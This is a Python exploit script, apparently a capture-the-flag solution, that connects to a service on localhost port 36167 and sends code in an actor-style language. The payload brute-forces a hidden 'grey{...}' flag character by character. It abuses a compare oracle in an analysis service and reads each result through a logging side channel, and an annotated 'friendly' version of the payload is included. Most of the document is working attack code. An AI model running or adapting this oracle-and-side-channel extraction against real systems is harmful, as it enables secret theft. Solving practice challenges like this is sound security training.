import socket
import time

SERVER = 'localhost'   # Update accordingly
PORT = 36167

retriever_code = b'send(analysisService,("analyze",self()));let val r=receive val a=["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","{","}","_","!","@","-"]val l=r[hn(_,n)=>n]fun e i=if i>=l then""else let fun b a=case a of[]=>"?"|c::t=>send(analysisService,("compare",self(),i,c));if r[hn(_,m)=>send(logService,("log",self(),m));r[hn(_,s)=>s]]then c else b t in b a^(e(i+1))end in e 0 end\nEOF\n'

'''  ## Equivalent "friendly" code

send(analysisService, ("analyze", self()));
let 
    val charset = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o",
            "p","q","r","s","t","u","v","w","x","y","z","0","1","2","3",
            "4","5","6","7","8","9","A","B","C","D","E","F","G","H","I",
            "J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X",
            "Y","Z","{","}","_","!","@","-"]
    val len = receive [ hn ("analysis", n) => n ]
    fun extractChar idx =
        if idx >= len then ""
        else
            let
                fun tryChar chars =
                    case chars of
                        [] => "?"
                        | c :: rest =>
                            send(analysisService, ("compare", self(), idx, c));
                            let
                                val matched = receive [ 
                                    hn ("comparison", result) => 
                                        send(logService, ("log", self(), result));
                                        receive[
                                            hn ("logged", sanitized) => sanitized
                                        ]
                                ] 
                            in
                                if matched then c
                                else tryChar rest
                            end
            in
                (tryChar charset) ^ (extractChar (idx + 1))
            end
in
    extractChar 0
end
EOF
'''

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((SERVER, PORT))  

sock.recv(4096).decode("utf-8")

for i in range(5):
    time.sleep(1)
    sock.send("4\n".encode())
    sock.recv(4096).decode("utf-8")
    sock.send(retriever_code)
    res = sock.recv(4096).decode("utf-8")
    if "grey{" in res:
        print(res)
        break

sock.close()